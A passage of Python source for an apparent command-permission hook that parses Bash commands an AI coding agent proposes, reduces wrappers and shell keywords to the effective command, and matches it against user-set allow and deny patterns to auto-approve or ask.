        fname, remainder = _strip_function_def_header(cmd)
        if fname is not None:
            if not remainder:
                return ''
            cmd = remainder

        # Bash arithmetic compound command: (( expr )) — only performs arithmetic,
        # runs no shell command. Any nested $() inside were already extracted as
        # CMD_SUBST tokens by the parser and are validated independently, so
        # reducing this to '' cannot hide a dangerous sub-command.
        if cmd.startswith('(('):
            return ''

        tokens = cmd.split()
        guard = 0
        while tokens and guard < 20:
            guard += 1
            head = tokens[0]

            # Loop/case headers and block terminators are scaffolding that runs
            # nothing on its own; the whole sub-command reduces to a no-op.
            if head in SCAFFOLDING_KEYWORDS:
                return ''

            # No-op builtins (`:`, `true`, `false`, `exit`, `return`) run nothing
            # dangerous regardless of their arguments, so the whole sub-command
            # reduces to a no-op. Matched on the bare head (these are builtins,
            # never path-qualified).
            if head in NOOP_BUILTINS:
                return ''

            # `case WORD in` is a header whose WORD is data, not a command (like
            # `for ... in`). Peel `case ... in` so the arm bodies that follow are
            # validated on their own merits. This matters for the FIRST arm: the
            # parser splits a `case` body on `;;`, so the first arm's body comes
            # through glued to the `case ... in` line (`case "$x" in foo) cmd`).
            # Without peeling, that whole segment starts with `case` and would be
            # swallowed by a broad `Bash(case:*)` allow, hiding `cmd`. A command
            # substitution in WORD is extracted by the parser and validated
            # independently, so dropping the header cannot hide it. A `case` with
            # no `in` yet (split across segments) runs nothing -> no-op.
            if head == 'case':
                if 'in' in tokens[1:]:
                    rest = tokens[tokens.index('in', 1) + 1:]
                    # The token right after `in` is always the first arm's
                    # pattern label (`foo)`, `*)`), never a command — drop it so
                    # only the arm body remains. We drop it unconditionally
                    # rather than via the `)`-based rule below because an
                    # empty-body first arm (`case $x in *=0) ;;`) loses its
                    # trailing `)` to _strip_grouping_tokens, leaving a bare
                    # `*=0` the `)`-rule would not recognize.
                    tokens = rest[1:] if rest else rest
                    continue
                return ''

            # Peel a leading case-arm pattern label (`*)`, `foo)`, `*.txt)`).
            # Subsequent arms come through as their own `;;`-split segment with
            # the body glued to the label (`*) echo "$kv"`); the first arm is
            # exposed by the `case ... in` peel above. A token ending in an
            # unbalanced `)` can only be a case pattern in valid bash — `)` is a
            # metacharacter, so no simple command is named that — so stripping
            # the label and validating the arm body cannot authorize anything the
            # user did not write. (A leading `(` is excluded so a subshell
            # fragment like `(cmd` is left for _strip_grouping_tokens;
            # alternation labels like `a|b)` are split on `|` by the parser and
            # remain only partially handled.)
            if (head.endswith(')') and not head.startswith('(')
                    and head.count(')') > head.count('(')):
                tokens = tokens[1:]
                continue

            if head in CONTROL_KEYWORD_PREFIXES:
                tokens = tokens[1:]
                continue

            # Peel leading `KEY=VALUE` environment assignments (e.g.
            # `PORT=3100 pnpm start`) so we validate the command that actually
            # runs, not the assignment. Without this, the env prefix glues to the
            # command and the allow-pattern prefix match (`Bash(pnpm:*)`) fails.
            if BashCommandParser._is_env_prefix(head):
                tokens = tokens[1:]
                continue

            name = os.path.basename(head)

            if name == 'command':
                # Split `command`'s own leading flags from the operand.
                rest = tokens[1:]
                flags = []
                while rest and rest[0].startswith('-') and rest[0] != '--':
                    flags.append(rest[0])
                    rest = rest[1:]
                if rest[:1] == ['--']:
                    rest = rest[1:]
                # `-v`/`-V` (e.g. `command -v X`, `command -pv X`) => lookup mode:
                # nothing runs, so the operand is irrelevant — treat as harmless.
                if any(set(f.lstrip('-')) & COMMAND_LOOKUP_FLAGS for f in flags):
                    return ''
                # Exec mode (`command [-p] NAME ...`): validate the operand.
                tokens = rest
                continue

            if name in WRAPPER_PREFIXES:
                positional = WRAPPER_PREFIXES[name]
                arg_flags = WRAPPER_ARG_FLAGS.get(name, frozenset())
                tokens = tokens[1:]
                # Skip the wrapper's own flags and KEY=VALUE assignments. A flag
                # that takes a SEPARATE argument (e.g. `env -u NAME`) also eats
                # the next token, so it is not mistaken for the command name.
                while tokens and (tokens[0].startswith('-')
                                  or BashCommandParser._is_env_prefix(tokens[0])):
                    flag = tokens[0]
                    tokens = tokens[1:]
                    if (flag in arg_flags and tokens
                            and not tokens[0].startswith('-')):
                        tokens = tokens[1:]
                # Skip the wrapper's fixed leading positional args (e.g. duration).
                for _ in range(positional):
                    if tokens and not tokens[0].startswith('-'):
                        tokens = tokens[1:]
                continue

            break

        return ' '.join(tokens)

    def _expand_constants(self, cmd: str, const_assignments: dict,
                          cmd_offset: int) -> str:
        """
        Substitute `$VAR`/`${VAR}` references in cmd with constant literals
        assigned earlier in the same compound command.

        Args:
            cmd: Normalized sub-command string.
            const_assignments: name -> list of (offset, literal_or_None) for
                every standalone assignment of that name, sorted by offset.
                A literal of None marks a non-constant (e.g. dynamic) value.
            cmd_offset: Source offset of this sub-command. Only assignments at a
                strictly smaller offset are eligible — bash binds variables in
                source order, so a use cannot see an assignment that follows it.

        Resolution picks the latest eligible assignment for each name (matching
        bash's last-write-wins). If that assignment is non-constant, the
        reference is left untouched (the value is unknown, so the command stays
        on its normal allow/deny path). Unknown names are likewise left as-is.
        """
        if not const_assignments or '$' not in cmd:
            return cmd

        def resolve(name):
            eligible = [
                lit for off, lit in const_assignments.get(name, [])
                if cmd_offset is None or off < cmd_offset
            ]
            # Latest write wins; a trailing non-constant poisons the reference.
            return eligible[-1] if eligible else None

        def repl(match):
            name = match.group('braced') or match.group('plain')
            literal = resolve(name)
            return literal if literal is not None else match.group(0)

        return _VAR_REF_RE.sub(repl, cmd)

    def _check_single_command(self, cmd: str, function_defs: dict = None,
                              cmd_offset: int = None) -> Dict[str, Any]:
        """
        Check if single command matches any pattern

        Args:
            cmd: Normalized command string
            function_defs: Map of function name -> earliest source offset at which
                it is defined in this same compound command. A call to one of
                these executes only its body (validated separately), so it is
                treated as a no-op — but only when the definition lexically
                precedes this call (see cmd_offset).
            cmd_offset: Source offset of this sub-command. A call is treated as a
                no-op only if its function was defined at a strictly smaller
                offset; this prevents a command from being auto-allowed because a
                same-named function is defined *after* it (and so is not yet in
                effect when the command runs).

        Returns:
            Dictionary with:
            - command: The command checked
            - allowed: Boolean - matches an allow pattern
            - denied: Boolean - matches a deny pattern
            - matched_patterns: List of patterns that matched
        """
        matched_allow = []
        matched_deny = []

        # Reduce wrappers/keywords to the command that actually runs, so we never
        # authorize an arbitrary command just because its introducer is allowed.
        effective = self._reduce_to_effective_command(cmd)
        if effective != cmd:
            debug_log(f"Reduced {cmd!r} to effective command {effective!r}")
        if not effective:
            # Nothing dangerous runs: a bare control keyword / wrapper with no
            # command after it (e.g. 'do', 'env'), a loop header / block
            # terminator, a no-op builtin (':', 'exit', ...), a function-def
            # header, or a `command -v/-V` lookup.
            debug_log(f"Command {cmd!r} runs nothing (bare prefix or lookup) - auto-allowing")
            return {
                'command': cmd,
                'allowed': True,
                'denied': False,
                'matched_allow_patterns': ['control_prefix'],
                'matched_deny_patterns': []
            }
        cmd = effective

        # A call to a function defined EARLIER in this same compound command runs
        # only its (separately validated) body, so it is a no-op here. This also
        # correctly handles a function that shadows a real binary
        # (`rm() { ...; }; rm x`): the function runs, not the binary. The offset
        # guard is what keeps this safe — a same-named function defined *after*
        # this command (or inside the same substitution) is not yet in effect, so
        # the real binary would run and the command must be validated for real.
        if function_defs and cmd_offset is not None:
            head = effective.split()[0] if effective.split() else ''
            def_offset = function_defs.get(head)
            if def_offset is not None and def_offset < cmd_offset:
                debug_log(f"Command {cmd!r} calls local function {head!r} "
                          f"(defined at {def_offset} < {cmd_offset}) - auto-allowing")
                return {
                    'command': cmd,
                    'allowed': True,
                    'denied': False,
                    'matched_allow_patterns': ['local_function'],
                    'matched_deny_patterns': []
                }

        # First check: workspace binaries are always allowed
        if self._is_workspace_binary(cmd):
            debug_log(f"Command {cmd!r} is a workspace binary - auto-allowing")
            return {
                'command': cmd,
                'allowed': True,
                'denied': False,
                'matched_allow_patterns': ['workspace_binary'],
                'matched_deny_patterns': []
            }

        # Second check: rm for workspace files is allowed
        if self._is_workspace_rm(cmd):
            debug_log(f"Command {cmd!r} is workspace rm - auto-allowing")
            return {
                'command': cmd,
                'allowed': True,
                'denied': False,
                'matched_allow_patterns': ['workspace_rm'],
                'matched_deny_patterns': []
            }

        # Build the candidate command strings to match against patterns.
        # Path-qualified invocations (e.g. /bin/ls, /usr/bin/grep) are reduced to
        # a bare-name variant (ls, grep) so they match the same Bash(<name>:*)
        # patterns as the bare command. Generated commands vary in this way.
        candidates = [cmd]
        normalized = self._basename_variant(cmd)
        if normalized != cmd:
            candidates.append(normalized)
            debug_log(f"Basename-normalized variant: {normalized!r}")

        # Check deny patterns first (deny takes precedence)
        for pattern in self.denied_patterns:
            if any(self._matches_pattern(c, pattern) for c in candidates):
                matched_deny.append(pattern)

        # Check allow patterns
        for pattern in self.allowed_patterns:
            if any(self._matches_pattern(c, pattern) for c in candidates):
                matched_allow.append(pattern)

        return {
            'command': cmd,
            'allowed': len(matched_allow) > 0,
            'denied': len(matched_deny) > 0,
            'matched_allow_patterns': matched_allow,
            'matched_deny_patterns': matched_deny
        }

    def _matches_pattern(self, command: str, pattern: str) -> bool:
        """
        Check if command matches a Bash(...) pattern

        Args:
            command: Command string (e.g. "git diff file.txt")
            pattern: Pattern from settings (e.g. "Bash(git diff:*)")

        Returns:
            True if matches, False otherwise

        Examples:
            command='git diff file.txt', pattern='Bash(git diff:*)' → True
            command='git status', pattern='Bash(git diff:*)' → False
            command='pwd', pattern='Bash(pwd)' → True
        """
        # Only match Bash patterns
        if not pattern.startswith('Bash('):
            return False

        # Extract inner pattern from Bash(...)
        if not pattern.endswith(')'):
            return False

        inner = pattern[5:-1]  # Remove 'Bash(' and ')'

        # Check for wildcard suffix
        if inner.endswith(':*'):
            prefix = inner[:-2]
            # Prefix (wildcard) match, but only at a command-word boundary so a
            # command-name prefix does not bleed into a longer word: `Bash(tr:*)`
            # must match `tr -d x` but NOT `trap ...` or `truncate ...`. A bare
            # `command.startswith(prefix)` would wrongly green-light `trap` (and
            # likewise let a deny pattern over-match). We accept the match when:
            #   - the prefix IS the whole command (`tr`),
            #   - the char right after the prefix is whitespace (a new argument:
            #     `tr -d x`), or
            #   - the prefix ends in a non-alphanumeric separator, where
            #     continuing the same token is the intended behaviour — this
            #     preserves path/operator prefixes like `./:*`, `[:*`, `git log
            #     --oneline /tmp/:*`.
            if not command.startswith(prefix):
                matches = False
            elif len(command) == len(prefix):
                matches = True
            elif command[len(prefix)].isspace():
                matches = True
            elif not prefix[-1:].isalnum():
                matches = True
            else:
                matches = False
            debug_log(f"    Pattern {pattern!r}: prefix match {prefix!r} → {matches}")
            return matches
        else:
            # Exact match
            matches = command == inner
            debug_log(f"    Pattern {pattern!r}: exact match → {matches}")
            return matches


def main():
    """Main hook entry point"""

    # Check for replay mode (for testing edge cases)
    # Set CLAUDE_HOOK_REPLAY=1 or pass --replay flag via arguments
    if os.environ.get('CLAUDE_HOOK_REPLAY', '0') == '1':
        replay_from_log()
        return

    # Also check if we're being called with command-line args suggesting replay
    if len(sys.argv) > 1 and '--help' not in sys.argv:
        # If there are command line args, assume replay mode
        replay_from_log()
        return

    # Check if stdin looks like JSON log lines (replay mode detection)
    # Try to peek at first line to detect format
    # Note: We need to read all stdin since we can't seek on a pipe
    try:
        # Save the original stdin for potential replay use
        full_stdin = sys.stdin.read()
        sys.stdin = io.StringIO(full_stdin)

        if full_stdin:
            first_line = full_stdin.split('\n')[0]
            if first_line:
                # Try to parse as JSON - if it has 'command' field and no 'tool_name',
                # it's likely a log entry for replay
                try:
                    peek_entry = json.loads(first_line.strip())
                    if 'command' in peek_entry and 'tool_name' not in peek_entry:
                        # Looks like a log entry, use replay mode
                        # Pass the pre-read lines to replay_from_log
                        replay_from_log(full_stdin.splitlines())
                        return
                except json.JSONDecodeError:
                    # Not JSON, continue with normal hook mode
                    pass
    except Exception:
        # Can't peek, continue with normal hook mode
        pass

    try:
        # Read hook input from stdin
        raw_input = sys.stdin.read()
        debug_log(f"=== Hook called ===")
        debug_log(f"Raw input: {raw_input[:500]}...")  # First 500 chars

        input_data = json.loads(raw_input)
        debug_log(f"Parsed input: {json.dumps(input_data, indent=2)}")

        # Extract tool info
        tool_name = input_data.get('tool_name', '')
        tool_input = input_data.get('tool_input', {})

        # Extract session info for correlation
        session_id = input_data.get('session_id', '')

        # Process tools that execute a shell command. Bash is the obvious one;
        # Monitor is a built-in that runs an until-loop shell command and is
        # otherwise gated by Claude Code's own coarse heuristic (which, e.g.,
        # flags any `cd ...; ... > x` as a path-resolution bypass even for
        # `2>/dev/null`). Both carry the command in tool_input['command'], so the
        # same validator applies; an `allow` here bypasses that built-in prompt.
        if tool_name not in ('Bash', 'Monitor'):
            debug_log(f"Not a command-bearing tool (got {tool_name!r}), allowing")
            sys.exit(0)

        # Get command
        command = tool_input.get('command', '')
        if not command:
            debug_log("No command found, allowing")
            sys.exit(0)

        # Get workspace directory from the hook payload when available.
        workspace_dir = resolve_workspace_dir(input_data)
        debug_log(f"Workspace: {workspace_dir}")

        # Initialize components
        settings_loader = SettingsLoader(workspace_dir)
        parser = BashCommandParser()
        validator = BashPermissionValidator(settings_loader, parser, workspace_dir)

        # Validate command
        result = validator.validate_bash_command(command)

        debug_log(f"Validation result: {json.dumps(result, indent=2)}")

        # Log commands that were NOT auto-approved (ask or deny)
        # These require manual confirmation from the user
        if result['decision'] != 'allow':
            log_manual_confirmation(command, result, workspace_dir, session_id)

        # Make decision
        if result['decision'] == 'allow':
            # Explicitly allow - bypass normal permission system
            output = {
                'hookSpecificOutput': {
                    'hookEventName': 'PreToolUse',
                    'permissionDecision': 'allow'
                }
            }
            print(json.dumps(output))
            debug_log(f"ALLOWING command (bypassing normal permissions)")
            sys.exit(0)
        elif result['decision'] == 'ask':
            # Ask user via native Claude permission flow
            # This triggers the PermissionRequest hook for additional handling
            output = {
                'hookSpecificOutput': {
                    'hookEventName': 'PreToolUse',
                    'permissionDecision': 'ask',
                    'permissionDecisionReason': result['reason']
                }
            }
            print(json.dumps(output))
            debug_log(f"ASKING for permission: {result['reason']}")
            sys.exit(0)
        else:
            # Fallback (should not reach here normally)
            debug_log(f"Unexpected decision '{result['decision']}': {result['reason']}")
            sys.exit(0)

    except Exception as e:
        # On error, allow (fail open to avoid breaking things)
        debug_log(f"ERROR: {type(e).__name__}: {str(e)}")
        import traceback
        debug_log(f"Traceback:\n{traceback.format_exc()}")
        sys.exit(0)


if __name__ == '__main__':
    main()
